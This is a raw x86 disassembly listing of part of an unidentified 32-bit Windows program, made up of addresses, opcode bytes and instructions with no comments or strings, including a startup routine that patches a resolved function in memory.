  402c84:	8d 8d 00 f8 ff ff    	lea    -0x800(%ebp),%ecx
  402c8a:	e8 6a 7c 00 00       	call   0x40a8f9
  402c8f:	6a 02                	push   $0x2
  402c91:	ff 75 08             	push   0x8(%ebp)
  402c94:	6a 0a                	push   $0xa
  402c96:	6a 0a                	push   $0xa
  402c98:	68 aa 12 40 00       	push   $0x4012aa
  402c9d:	ff 35 e0 39 42 00    	push   0x4239e0
  402ca3:	e8 d2 f9 ff ff       	call   0x40267a
  402ca8:	83 c4 30             	add    $0x30,%esp
  402cab:	c9                   	leave
  402cac:	c3                   	ret
  402cad:	55                   	push   %ebp
  402cae:	8b ec                	mov    %esp,%ebp
  402cb0:	81 ec 00 08 00 00    	sub    $0x800,%esp
  402cb6:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  402cbc:	56                   	push   %esi
  402cbd:	50                   	push   %eax
  402cbe:	e8 b4 3f 00 00       	call   0x406c77
  402cc3:	e8 ed 3f 00 00       	call   0x406cb5
  402cc8:	33 f6                	xor    %esi,%esi
  402cca:	56                   	push   %esi
  402ccb:	50                   	push   %eax
  402ccc:	56                   	push   %esi
  402ccd:	56                   	push   %esi
  402cce:	6a 38                	push   $0x38
  402cd0:	8d 8d 00 f8 ff ff    	lea    -0x800(%ebp),%ecx
  402cd6:	e8 1e 7c 00 00       	call   0x40a8f9
  402cdb:	6a 02                	push   $0x2
  402cdd:	ff 75 08             	push   0x8(%ebp)
  402ce0:	89 35 fc 21 41 00    	mov    %esi,0x4121fc
  402ce6:	6a 05                	push   $0x5
  402ce8:	6a 05                	push   $0x5
  402cea:	68 8a 19 40 00       	push   $0x40198a
  402cef:	ff 35 18 fc 41 00    	push   0x41fc18
  402cf5:	89 35 54 21 41 00    	mov    %esi,0x412154
  402cfb:	e8 7a f9 ff ff       	call   0x40267a
  402d00:	83 c4 30             	add    $0x30,%esp
  402d03:	e8 67 6f 00 00       	call   0x409c6f
  402d08:	33 c0                	xor    %eax,%eax
  402d0a:	40                   	inc    %eax
  402d0b:	5e                   	pop    %esi
  402d0c:	c9                   	leave
  402d0d:	c3                   	ret
  402d0e:	83 25 fc 21 41 00 00 	andl   $0x0,0x4121fc
  402d15:	83 25 54 21 41 00 00 	andl   $0x0,0x412154
  402d1c:	6a 02                	push   $0x2
  402d1e:	ff 74 24 08          	push   0x8(%esp)
  402d22:	6a 0a                	push   $0xa
  402d24:	6a 0a                	push   $0xa
  402d26:	68 52 16 40 00       	push   $0x401652
  402d2b:	6a 01                	push   $0x1
  402d2d:	e8 48 f9 ff ff       	call   0x40267a
  402d32:	83 c4 18             	add    $0x18,%esp
  402d35:	e8 35 6f 00 00       	call   0x409c6f
  402d3a:	33 c0                	xor    %eax,%eax
  402d3c:	40                   	inc    %eax
  402d3d:	c3                   	ret
  402d3e:	55                   	push   %ebp
  402d3f:	8b ec                	mov    %esp,%ebp
  402d41:	81 ec 00 08 00 00    	sub    $0x800,%esp
  402d47:	56                   	push   %esi
  402d48:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  402d4e:	57                   	push   %edi
  402d4f:	50                   	push   %eax
  402d50:	e8 22 3f 00 00       	call   0x406c77
  402d55:	59                   	pop    %ecx
  402d56:	e8 5a 3f 00 00       	call   0x406cb5
  402d5b:	8b 0d b8 d0 41 00    	mov    0x41d0b8,%ecx
  402d61:	33 f6                	xor    %esi,%esi
  402d63:	83 c1 64             	add    $0x64,%ecx
  402d66:	39 35 7c 3d 42 00    	cmp    %esi,0x423d7c
  402d6c:	6a 02                	push   $0x2
  402d6e:	5f                   	pop    %edi
  402d6f:	74 03                	je     0x402d74
  402d71:	33 ff                	xor    %edi,%edi
  402d73:	47                   	inc    %edi
  402d74:	56                   	push   %esi
  402d75:	50                   	push   %eax
  402d76:	56                   	push   %esi
  402d77:	56                   	push   %esi
  402d78:	51                   	push   %ecx
  402d79:	8d 8d 00 f8 ff ff    	lea    -0x800(%ebp),%ecx
  402d7f:	e8 75 7b 00 00       	call   0x40a8f9
  402d84:	57                   	push   %edi
  402d85:	ff 75 08             	push   0x8(%ebp)
  402d88:	89 35 fc 21 41 00    	mov    %esi,0x4121fc
  402d8e:	6a 14                	push   $0x14
  402d90:	6a 14                	push   $0x14
  402d92:	68 14 22 40 00       	push   $0x402214
  402d97:	ff 35 28 04 42 00    	push   0x420428
  402d9d:	89 35 54 21 41 00    	mov    %esi,0x412154
  402da3:	e8 d2 f8 ff ff       	call   0x40267a
  402da8:	83 c4 2c             	add    $0x2c,%esp
  402dab:	e8 bf 6e 00 00       	call   0x409c6f
  402db0:	33 c0                	xor    %eax,%eax
  402db2:	5f                   	pop    %edi
  402db3:	40                   	inc    %eax
  402db4:	5e                   	pop    %esi
  402db5:	c9                   	leave
  402db6:	c3                   	ret
  402db7:	6a 01                	push   $0x1
  402db9:	ff 74 24 08          	push   0x8(%esp)
  402dbd:	6a 14                	push   $0x14
  402dbf:	6a 14                	push   $0x14
  402dc1:	68 3a 18 40 00       	push   $0x40183a
  402dc6:	ff 35 28 04 42 00    	push   0x420428
  402dcc:	e8 a9 f8 ff ff       	call   0x40267a
  402dd1:	83 c4 18             	add    $0x18,%esp
  402dd4:	c3                   	ret
  402dd5:	6a 02                	push   $0x2
  402dd7:	ff 74 24 08          	push   0x8(%esp)
  402ddb:	6a 14                	push   $0x14
  402ddd:	6a 14                	push   $0x14
  402ddf:	68 73 14 40 00       	push   $0x401473
  402de4:	ff 35 dc fd 41 00    	push   0x41fddc
  402dea:	e8 8b f8 ff ff       	call   0x40267a
  402def:	83 c4 18             	add    $0x18,%esp
  402df2:	c3                   	ret
  402df3:	55                   	push   %ebp
  402df4:	8b ec                	mov    %esp,%ebp
  402df6:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  402dfc:	81 ec 00 08 00 00    	sub    $0x800,%esp
  402e02:	50                   	push   %eax
  402e03:	e8 6f 3e 00 00       	call   0x406c77
  402e08:	e8 a8 3e 00 00       	call   0x406cb5
  402e0d:	33 c9                	xor    %ecx,%ecx
  402e0f:	51                   	push   %ecx
  402e10:	50                   	push   %eax
  402e11:	51                   	push   %ecx
  402e12:	51                   	push   %ecx
  402e13:	6a 36                	push   $0x36
  402e15:	8d 8d 00 f8 ff ff    	lea    -0x800(%ebp),%ecx
  402e1b:	e8 d9 7a 00 00       	call   0x40a8f9
  402e20:	6a 01                	push   $0x1
  402e22:	ff 75 08             	push   0x8(%ebp)
  402e25:	6a 14                	push   $0x14
  402e27:	6a 14                	push   $0x14
  402e29:	68 a0 1a 40 00       	push   $0x401aa0
  402e2e:	ff 35 20 9f 41 00    	push   0x419f20
  402e34:	e8 41 f8 ff ff       	call   0x40267a
  402e39:	83 c4 30             	add    $0x30,%esp
  402e3c:	c9                   	leave
  402e3d:	c3                   	ret
  402e3e:	55                   	push   %ebp
  402e3f:	8d 6c 24 8c          	lea    -0x74(%esp),%ebp
  402e43:	b8 f8 38 00 00       	mov    $0x38f8,%eax
  402e48:	e8 63 a7 00 00       	call   0x40d5b0
  402e4d:	53                   	push   %ebx
  402e4e:	33 db                	xor    %ebx,%ebx
  402e50:	39 1d 1c 9f 41 00    	cmp    %ebx,0x419f1c
  402e56:	89 5d 68             	mov    %ebx,0x68(%ebp)
  402e59:	0f 8e 1f 04 00 00    	jle    0x40327e
  402e5f:	56                   	push   %esi
  402e60:	57                   	push   %edi
  402e61:	8b 75 68             	mov    0x68(%ebp),%esi
  402e64:	33 c0                	xor    %eax,%eax
  402e66:	40                   	inc    %eax
  402e67:	89 45 6c             	mov    %eax,0x6c(%ebp)
  402e6a:	89 45 70             	mov    %eax,0x70(%ebp)
  402e6d:	8d 45 6c             	lea    0x6c(%ebp),%eax
  402e70:	50                   	push   %eax
  402e71:	8d 45 44             	lea    0x44(%ebp),%eax
  402e74:	6a 7c                	push   $0x7c
  402e76:	c1 e6 02             	shl    $0x2,%esi
  402e79:	50                   	push   %eax
  402e7a:	8b 86 e8 39 42 00    	mov    0x4239e8(%esi),%eax
  402e80:	66 33 ff             	xor    %di,%di
  402e83:	e8 e3 29 00 00       	call   0x40586b
  402e88:	8d 45 70             	lea    0x70(%ebp),%eax
  402e8b:	50                   	push   %eax
  402e8c:	53                   	push   %ebx
  402e8d:	6a 2d                	push   $0x2d
  402e8f:	8d 45 58             	lea    0x58(%ebp),%eax
  402e92:	50                   	push   %eax
  402e93:	ff b6 30 35 42 00    	push   0x423530(%esi)
  402e99:	e8 5d 2a 00 00       	call   0x4058fb
  402e9e:	83 c4 20             	add    $0x20,%esp
  402ea1:	83 7d 70 01          	cmpl   $0x1,0x70(%ebp)
  402ea5:	74 0d                	je     0x402eb4
  402ea7:	8b 45 58             	mov    0x58(%ebp),%eax
  402eaa:	39 45 5c             	cmp    %eax,0x5c(%ebp)
  402ead:	7e 05                	jle    0x402eb4
  402eaf:	29 45 5c             	sub    %eax,0x5c(%ebp)
  402eb2:	eb 03                	jmp    0x402eb7
  402eb4:	89 5d 5c             	mov    %ebx,0x5c(%ebp)
  402eb7:	68 00 10 00 00       	push   $0x1000
  402ebc:	bf 40 08 42 00       	mov    $0x420840,%edi
  402ec1:	57                   	push   %edi
  402ec2:	53                   	push   %ebx
  402ec3:	ff 15 b0 e0 40 00    	call   *0x40e0b0
  402ec9:	85 c0                	test   %eax,%eax
  402ecb:	74 09                	je     0x402ed6
  402ecd:	8b d7                	mov    %edi,%edx
  402ecf:	e8 25 3e 00 00       	call   0x406cf9
  402ed4:	eb 0c                	jmp    0x402ee2
  402ed6:	57                   	push   %edi
  402ed7:	68 00 10 00 00       	push   $0x1000
  402edc:	ff 15 d4 e0 40 00    	call   *0x40e0d4
  402ee2:	8d 85 7c c7 ff ff    	lea    -0x3884(%ebp),%eax
  402ee8:	50                   	push   %eax
  402ee9:	8b d7                	mov    %edi,%edx
  402eeb:	e8 21 26 00 00       	call   0x405511
  402ef0:	59                   	pop    %ecx
  402ef1:	b9 34 e3 40 00       	mov    $0x40e334,%ecx
  402ef6:	8d 85 7c c7 ff ff    	lea    -0x3884(%ebp),%eax
  402efc:	e8 ec 25 00 00       	call   0x4054ed
  402f01:	8b 8e e8 36 42 00    	mov    0x4236e8(%esi),%ecx
  402f07:	e8 e1 25 00 00       	call   0x4054ed
  402f0c:	8b 96 b8 50 41 00    	mov    0x4150b8(%esi),%edx
  402f12:	3b d3                	cmp    %ebx,%edx
  402f14:	74 14                	je     0x402f2a
  402f16:	b8 64 e2 40 00       	mov    $0x40e264,%eax
  402f1b:	e8 47 25 00 00       	call   0x405467
  402f20:	85 c0                	test   %eax,%eax
  402f22:	75 06                	jne    0x402f2a
  402f24:	89 9e b8 50 41 00    	mov    %ebx,0x4150b8(%esi)
  402f2a:	8b 86 40 28 42 00    	mov    0x422840(%esi),%eax
  402f30:	8d 88 40 0d 03 00    	lea    0x30d40(%eax),%ecx
  402f36:	8d b8 e0 93 04 00    	lea    0x493e0(%eax),%edi
  402f3c:	05 80 1a 06 00       	add    $0x61a80,%eax
  402f41:	89 45 54             	mov    %eax,0x54(%ebp)
  402f44:	8b 45 6c             	mov    0x6c(%ebp),%eax
  402f47:	6b c0 03             	imul   $0x3,%eax,%eax
  402f4a:	50                   	push   %eax
  402f4b:	89 4d 50             	mov    %ecx,0x50(%ebp)
  402f4e:	ff 15 64 e0 40 00    	call   *0x40e064
  402f54:	50                   	push   %eax
  402f55:	57                   	push   %edi
  402f56:	e8 2b 78 00 00       	call   0x40a786
  402f5b:	ff 75 58             	push   0x58(%ebp)
  402f5e:	8a 4d 5c             	mov    0x5c(%ebp),%cl
  402f61:	e8 ec 45 00 00       	call   0x407552
  402f66:	8b 55 44             	mov    0x44(%ebp),%edx
  402f69:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  402f6f:	50                   	push   %eax
  402f70:	89 5d 70             	mov    %ebx,0x70(%ebp)
  402f73:	e8 99 25 00 00       	call   0x405511
  402f78:	83 c4 14             	add    $0x14,%esp
  402f7b:	e8 cd 28 00 00       	call   0x40584d
  402f80:	99                   	cltd
  402f81:	bf e8 03 00 00       	mov    $0x3e8,%edi
  402f86:	8b cf                	mov    %edi,%ecx
  402f88:	f7 f9                	idiv   %ecx
  402f8a:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  402f90:	8b ca                	mov    %edx,%ecx
  402f92:	3b cb                	cmp    %ebx,%ecx
  402f94:	75 12                	jne    0x402fa8
  402f96:	66 c7 85 7c ff ff ff 	movw   $0x30,-0x84(%ebp)
  402f9d:	30 00 
  402f9f:	66 89 9d 7e ff ff ff 	mov    %bx,-0x82(%ebp)
  402fa6:	eb 05                	jmp    0x402fad
  402fa8:	e8 4c 27 00 00       	call   0x4056f9
  402fad:	8b c8                	mov    %eax,%ecx
  402faf:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  402fb5:	e8 33 25 00 00       	call   0x4054ed
  402fba:	b9 38 e3 40 00       	mov    $0x40e338,%ecx
  402fbf:	e8 29 25 00 00       	call   0x4054ed
  402fc4:	e8 84 28 00 00       	call   0x40584d
  402fc9:	99                   	cltd
  402fca:	8b cf                	mov    %edi,%ecx
  402fcc:	f7 f9                	idiv   %ecx
  402fce:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  402fd4:	8b ca                	mov    %edx,%ecx
  402fd6:	3b cb                	cmp    %ebx,%ecx
  402fd8:	75 12                	jne    0x402fec
  402fda:	66 c7 85 7c ff ff ff 	movw   $0x30,-0x84(%ebp)
  402fe1:	30 00 
  402fe3:	66 89 9d 7e ff ff ff 	mov    %bx,-0x82(%ebp)
  402fea:	eb 05                	jmp    0x402ff1
  402fec:	e8 08 27 00 00       	call   0x4056f9
  402ff1:	8b c8                	mov    %eax,%ecx
  402ff3:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  402ff9:	e8 ef 24 00 00       	call   0x4054ed
  402ffe:	b9 3c e3 40 00       	mov    $0x40e33c,%ecx
  403003:	e8 e5 24 00 00       	call   0x4054ed
  403008:	8d 85 7c ef ff ff    	lea    -0x1084(%ebp),%eax
  40300e:	50                   	push   %eax
  40300f:	ba 48 e3 40 00       	mov    $0x40e348,%edx
  403014:	e8 f8 24 00 00       	call   0x405511
  403019:	59                   	pop    %ecx
  40301a:	b9 54 e3 40 00       	mov    $0x40e354,%ecx
  40301f:	8d 85 7c ef ff ff    	lea    -0x1084(%ebp),%eax
  403025:	e8 c3 24 00 00       	call   0x4054ed
  40302a:	8b 8e 40 28 42 00    	mov    0x422840(%esi),%ecx
  403030:	3b cb                	cmp    %ebx,%ecx
  403032:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  403038:	75 12                	jne    0x40304c
  40303a:	66 c7 85 7c ff ff ff 	movw   $0x30,-0x84(%ebp)
  403041:	30 00 
  403043:	66 89 9d 7e ff ff ff 	mov    %bx,-0x82(%ebp)
  40304a:	eb 05                	jmp    0x403051
  40304c:	e8 a8 26 00 00       	call   0x4056f9
  403051:	8b c8                	mov    %eax,%ecx
  403053:	8d 85 7c ef ff ff    	lea    -0x1084(%ebp),%eax
  403059:	e8 8f 24 00 00       	call   0x4054ed
  40305e:	b9 68 e3 40 00       	mov    $0x40e368,%ecx
  403063:	e8 85 24 00 00       	call   0x4054ed
  403068:	8b 8e 38 50 41 00    	mov    0x415038(%esi),%ecx
  40306e:	e8 7a 24 00 00       	call   0x4054ed
  403073:	e8 d5 27 00 00       	call   0x40584d
  403078:	99                   	cltd
  403079:	8b cf                	mov    %edi,%ecx
  40307b:	f7 f9                	idiv   %ecx
  40307d:	8b ca                	mov    %edx,%ecx
  40307f:	3b cb                	cmp    %ebx,%ecx
  403081:	75 12                	jne    0x403095
  403083:	66 c7 85 7c ff ff ff 	movw   $0x30,-0x84(%ebp)
  40308a:	30 00 
  40308c:	66 89 9d 7e ff ff ff 	mov    %bx,-0x82(%ebp)
  403093:	eb 0b                	jmp    0x4030a0
  403095:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40309b:	e8 59 26 00 00       	call   0x4056f9
  4030a0:	8d 85 7c ef ff ff    	lea    -0x1084(%ebp),%eax
  4030a6:	53                   	push   %ebx
  4030a7:	50                   	push   %eax
  4030a8:	e8 a4 23 00 00       	call   0x405451
  4030ad:	59                   	pop    %ecx
  4030ae:	50                   	push   %eax
  4030af:	8d 85 7c ef ff ff    	lea    -0x1084(%ebp),%eax
  4030b5:	50                   	push   %eax
  4030b6:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4030bc:	e8 81 3c 00 00       	call   0x406d42
  4030c1:	8d 85 7c e7 ff ff    	lea    -0x1884(%ebp),%eax
  4030c7:	50                   	push   %eax
  4030c8:	ba 74 e3 40 00       	mov    $0x40e374,%edx
  4030cd:	e8 3f 24 00 00       	call   0x405511
  4030d2:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  4030d8:	8d 85 7c e7 ff ff    	lea    -0x1884(%ebp),%eax
  4030de:	e8 0a 24 00 00       	call   0x4054ed
  4030e3:	b9 84 e3 40 00       	mov    $0x40e384,%ecx
  4030e8:	e8 00 24 00 00       	call   0x4054ed
  4030ed:	b9 8c e3 40 00       	mov    $0x40e38c,%ecx
  4030f2:	e8 f6 23 00 00       	call   0x4054ed
  4030f7:	8d 8d 7c ef ff ff    	lea    -0x1084(%ebp),%ecx
  4030fd:	e8 eb 23 00 00       	call   0x4054ed
  403102:	8d 45 70             	lea    0x70(%ebp),%eax
  403105:	50                   	push   %eax
  403106:	8d 45 64             	lea    0x64(%ebp),%eax
  403109:	50                   	push   %eax
  40310a:	53                   	push   %ebx
  40310b:	6a 03                	push   $0x3
  40310d:	ff b6 b8 50 41 00    	push   0x4150b8(%esi)
  403113:	8d 85 7c c7 ff ff    	lea    -0x3884(%ebp),%eax
  403119:	50                   	push   %eax
  40311a:	8d 85 7c e7 ff ff    	lea    -0x1884(%ebp),%eax
  403120:	50                   	push   %eax
  403121:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  403127:	50                   	push   %eax
  403128:	e8 0f f4 ff ff       	call   0x40253c
  40312d:	83 c4 30             	add    $0x30,%esp
  403130:	3b c3                	cmp    %ebx,%eax
  403132:	0f 85 19 01 00 00    	jne    0x403251
  403138:	8b 45 64             	mov    0x64(%ebp),%eax
  40313b:	83 f8 04             	cmp    $0x4,%eax
  40313e:	0f 85 e9 00 00 00    	jne    0x40322d
  403144:	83 7d 6c 01          	cmpl   $0x1,0x6c(%ebp)
  403148:	0f 8e df 00 00 00    	jle    0x40322d
  40314e:	e8 fa 26 00 00       	call   0x40584d
  403153:	6a 5a                	push   $0x5a
  403155:	59                   	pop    %ecx
  403156:	99                   	cltd
  403157:	f7 f9                	idiv   %ecx
  403159:	51                   	push   %ecx
  40315a:	8a ca                	mov    %dl,%cl
  40315c:	e8 f1 43 00 00       	call   0x407552
  403161:	8b 55 48             	mov    0x48(%ebp),%edx
  403164:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  40316a:	50                   	push   %eax
  40316b:	e8 a1 23 00 00       	call   0x405511
  403170:	59                   	pop    %ecx
  403171:	59                   	pop    %ecx
  403172:	e8 d6 26 00 00       	call   0x40584d
  403177:	99                   	cltd
  403178:	8b cf                	mov    %edi,%ecx
  40317a:	f7 f9                	idiv   %ecx
  40317c:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  403182:	8b ca                	mov    %edx,%ecx
  403184:	3b cb                	cmp    %ebx,%ecx
  403186:	75 12                	jne    0x40319a
  403188:	66 c7 85 7c ff ff ff 	movw   $0x30,-0x84(%ebp)
  40318f:	30 00 
  403191:	66 89 9d 7e ff ff ff 	mov    %bx,-0x82(%ebp)
  403198:	eb 05                	jmp    0x40319f
  40319a:	e8 5a 25 00 00       	call   0x4056f9
  40319f:	8b c8                	mov    %eax,%ecx
  4031a1:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  4031a7:	e8 41 23 00 00       	call   0x4054ed
  4031ac:	b9 38 e3 40 00       	mov    $0x40e338,%ecx
  4031b1:	e8 37 23 00 00       	call   0x4054ed
  4031b6:	e8 92 26 00 00       	call   0x40584d
  4031bb:	99                   	cltd
  4031bc:	f7 ff                	idiv   %edi
  4031be:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4031c4:	8b ca                	mov    %edx,%ecx
  4031c6:	3b cb                	cmp    %ebx,%ecx
  4031c8:	75 12                	jne    0x4031dc
  4031ca:	66 c7 85 7c ff ff ff 	movw   $0x30,-0x84(%ebp)
  4031d1:	30 00 
  4031d3:	66 89 9d 7e ff ff ff 	mov    %bx,-0x82(%ebp)
  4031da:	eb 05                	jmp    0x4031e1
  4031dc:	e8 18 25 00 00       	call   0x4056f9
  4031e1:	8b c8                	mov    %eax,%ecx
  4031e3:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  4031e9:	e8 ff 22 00 00       	call   0x4054ed
  4031ee:	b9 3c e3 40 00       	mov    $0x40e33c,%ecx
  4031f3:	e8 f5 22 00 00       	call   0x4054ed
  4031f8:	8d 45 70             	lea    0x70(%ebp),%eax
  4031fb:	50                   	push   %eax
  4031fc:	8d 45 64             	lea    0x64(%ebp),%eax
  4031ff:	50                   	push   %eax
  403200:	53                   	push   %ebx
  403201:	6a 03                	push   $0x3
  403203:	ff b6 b8 50 41 00    	push   0x4150b8(%esi)
  403209:	8d 85 7c c7 ff ff    	lea    -0x3884(%ebp),%eax
  40320f:	50                   	push   %eax
  403210:	8d 85 7c e7 ff ff    	lea    -0x1884(%ebp),%eax
  403216:	50                   	push   %eax
  403217:	8d 85 7c f7 ff ff    	lea    -0x884(%ebp),%eax
  40321d:	50                   	push   %eax
  40321e:	e8 19 f3 ff ff       	call   0x40253c
  403223:	83 c4 20             	add    $0x20,%esp
  403226:	3b c3                	cmp    %ebx,%eax
  403228:	75 27                	jne    0x403251
  40322a:	8b 45 64             	mov    0x64(%ebp),%eax
  40322d:	c1 e0 10             	shl    $0x10,%eax
  403230:	39 5d 70             	cmp    %ebx,0x70(%ebp)
  403233:	8b f0                	mov    %eax,%esi
  403235:	75 0a                	jne    0x403241
  403237:	ff 15 64 e0 40 00    	call   *0x40e064
  40323d:	03 f0                	add    %eax,%esi
  40323f:	eb 03                	jmp    0x403244
  403241:	03 75 70             	add    0x70(%ebp),%esi
  403244:	8b 45 6c             	mov    0x6c(%ebp),%eax
  403247:	6b c0 0a             	imul   $0xa,%eax,%eax
  40324a:	50                   	push   %eax
  40324b:	56                   	push   %esi
  40324c:	ff 75 54             	push   0x54(%ebp)
  40324f:	eb 11                	jmp    0x403262
  403251:	8b 45 6c             	mov    0x6c(%ebp),%eax
  403254:	6b c0 0a             	imul   $0xa,%eax,%eax
  403257:	50                   	push   %eax
  403258:	ff 15 64 e0 40 00    	call   *0x40e064
  40325e:	50                   	push   %eax
  40325f:	ff 75 50             	push   0x50(%ebp)
  403262:	e8 1f 75 00 00       	call   0x40a786
  403267:	83 c4 0c             	add    $0xc,%esp
  40326a:	ff 45 68             	incl   0x68(%ebp)
  40326d:	8b 45 68             	mov    0x68(%ebp),%eax
  403270:	3b 05 1c 9f 41 00    	cmp    0x419f1c,%eax
  403276:	0f 8c e5 fb ff ff    	jl     0x402e61
  40327c:	5f                   	pop    %edi
  40327d:	5e                   	pop    %esi
  40327e:	33 c0                	xor    %eax,%eax
  403280:	40                   	inc    %eax
  403281:	5b                   	pop    %ebx
  403282:	83 c5 74             	add    $0x74,%ebp
  403285:	c9                   	leave
  403286:	c3                   	ret
  403287:	56                   	push   %esi
  403288:	33 f6                	xor    %esi,%esi
  40328a:	39 35 64 50 41 00    	cmp    %esi,0x415064
  403290:	7e 18                	jle    0x4032aa
  403292:	83 3c b5 b4 fd 41 00 	cmpl   $0x4,0x41fdb4(,%esi,4)
  403299:	04 
  40329a:	75 05                	jne    0x4032a1
  40329c:	e8 63 53 00 00       	call   0x408604
  4032a1:	46                   	inc    %esi
  4032a2:	3b 35 64 50 41 00    	cmp    0x415064,%esi
  4032a8:	7c e8                	jl     0x403292
  4032aa:	33 c0                	xor    %eax,%eax
  4032ac:	40                   	inc    %eax
  4032ad:	5e                   	pop    %esi
  4032ae:	c3                   	ret
  4032af:	6a 00                	push   $0x0
  4032b1:	ff 15 60 e0 40 00    	call   *0x40e060
  4032b7:	cc                   	int3
  4032b8:	55                   	push   %ebp
  4032b9:	8b ec                	mov    %esp,%ebp
  4032bb:	51                   	push   %ecx
  4032bc:	53                   	push   %ebx
  4032bd:	56                   	push   %esi
  4032be:	57                   	push   %edi
  4032bf:	e8 a4 37 00 00       	call   0x406a68
  4032c4:	a3 cc 7e 42 00       	mov    %eax,0x427ecc
  4032c9:	e8 11 38 00 00       	call   0x406adf
  4032ce:	8b 35 58 e1 40 00    	mov    0x40e158,%esi
  4032d4:	33 ff                	xor    %edi,%edi
  4032d6:	33 db                	xor    %ebx,%ebx
  4032d8:	47                   	inc    %edi
  4032d9:	53                   	push   %ebx
  4032da:	a3 a8 3e 42 00       	mov    %eax,0x423ea8
  4032df:	89 3d a4 10 41 00    	mov    %edi,0x4110a4
  4032e5:	ff d6                	call   *%esi
  4032e7:	57                   	push   %edi
  4032e8:	a3 b0 fd 41 00       	mov    %eax,0x41fdb0
  4032ed:	ff d6                	call   *%esi
  4032ef:	8b 35 5c e1 40 00    	mov    0x40e15c,%esi
  4032f5:	8b 3d 74 e0 40 00    	mov    0x40e074,%edi
  4032fb:	a3 78 52 41 00       	mov    %eax,0x415278
  403300:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403303:	50                   	push   %eax
  403304:	6a 08                	push   $0x8
  403306:	6a 0a                	push   $0xa
  403308:	56                   	push   %esi
  403309:	ff d7                	call   *%edi
  40330b:	c6 06 b8             	movb   $0xb8,(%esi)
  40330e:	46                   	inc    %esi
  40330f:	8b c6                	mov    %esi,%eax
  403311:	c6 00 07             	movb   $0x7,(%eax)
  403314:	40                   	inc    %eax
  403315:	88 18                	mov    %bl,(%eax)
  403317:	40                   	inc    %eax
  403318:	88 18                	mov    %bl,(%eax)
  40331a:	40                   	inc    %eax
  40331b:	88 18                	mov    %bl,(%eax)
  40331d:	40                   	inc    %eax
  40331e:	c6 00 c2             	movb   $0xc2,(%eax)
  403321:	40                   	inc    %eax
  403322:	c6 00 10             	movb   $0x10,(%eax)
  403325:	40                   	inc    %eax
  403326:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403329:	51                   	push   %ecx
  40332a:	88 18                	mov    %bl,(%eax)
  40332c:	ff 75 fc             	push   -0x4(%ebp)
  40332f:	40                   	inc    %eax
  403330:	6a 0a                	push   $0xa
  403332:	50                   	push   %eax
  403333:	ff d7                	call   *%edi
  403335:	68 af 32 40 00       	push   $0x4032af
  40333a:	ff 15 5c e0 40 00    	call   *0x40e05c
  403340:	68 98 e3 40 00       	push   $0x40e398
  403345:	ff 15 68 e0 40 00    	call   *0x40e068
  40334b:	8b f8                	mov    %eax,%edi
  40334d:	3b fb                	cmp    %ebx,%edi
  40334f:	74 48                	je     0x403399
  403351:	8b 35 6c e0 40 00    	mov    0x40e06c,%esi
  403357:	68 a0 e3 40 00       	push   $0x40e3a0
  40335c:	57                   	push   %edi
  40335d:	ff d6                	call   *%esi
  40335f:	68 b0 e3 40 00       	push   $0x40e3b0
  403364:	57                   	push   %edi
  403365:	a3 00 32 41 00       	mov    %eax,0x413200
  40336a:	ff d6                	call   *%esi
  40336c:	68 c4 e3 40 00       	push   $0x40e3c4
  403371:	57                   	push   %edi
  403372:	a3 f8 21 41 00       	mov    %eax,0x4121f8
  403377:	ff d6                	call   *%esi
  403379:	39 1d 00 32 41 00    	cmp    %ebx,0x413200
  40337f:	a3 50 21 41 00       	mov    %eax,0x412150
  403384:	74 13                	je     0x403399
  403386:	39 1d f8 21 41 00    	cmp    %ebx,0x4121f8
  40338c:	74 0b                	je     0x403399
  40338e:	33 c0                	xor    %eax,%eax
  403390:	89 1d a4 10 41 00    	mov    %ebx,0x4110a4
  403396:	40                   	inc    %eax
  403397:	eb 02                	jmp    0x40339b
  403399:	33 c0                	xor    %eax,%eax
  40339b:	5f                   	pop    %edi
  40339c:	5e                   	pop    %esi
  40339d:	5b                   	pop    %ebx
  40339e:	c9                   	leave
  40339f:	c3                   	ret
  4033a0:	85 f6                	test   %esi,%esi
  4033a2:	74 2d                	je     0x4033d1
  4033a4:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4033a8:	74 27                	je     0x4033d1
  4033aa:	b9 c8 3e 42 00       	mov    $0x423ec8,%ecx
  4033af:	e8 b0 8f 00 00       	call   0x40c364
  4033b4:	8b ce                	mov    %esi,%ecx
  4033b6:	8d 14 45 c8 3e 42 00 	lea    0x423ec8(,%eax,2),%edx
  4033bd:	e8 a2 8f 00 00       	call   0x40c364
  4033c2:	03 c0                	add    %eax,%eax
  4033c4:	50                   	push   %eax
  4033c5:	56                   	push   %esi
  4033c6:	52                   	push   %edx
  4033c7:	e8 aa 8a 00 00       	call   0x40be76
  4033cc:	66 83 24 10 00       	andw   $0x0,(%eax,%edx,1)
  4033d1:	56                   	push   %esi
  4033d2:	e8 63 8a 00 00       	call   0x40be3a
  4033d7:	59                   	pop    %ecx
  4033d8:	c3                   	ret
  4033d9:	55                   	push   %ebp
  4033da:	8b ec                	mov    %esp,%ebp
  4033dc:	0f b7 01             	movzwl (%ecx),%eax
  4033df:	81 ec 40 01 00 00    	sub    $0x140,%esp
  4033e5:	53                   	push   %ebx
  4033e6:	56                   	push   %esi
  4033e7:	33 f6                	xor    %esi,%esi
  4033e9:	66 85 c0             	test   %ax,%ax
  4033ec:	57                   	push   %edi
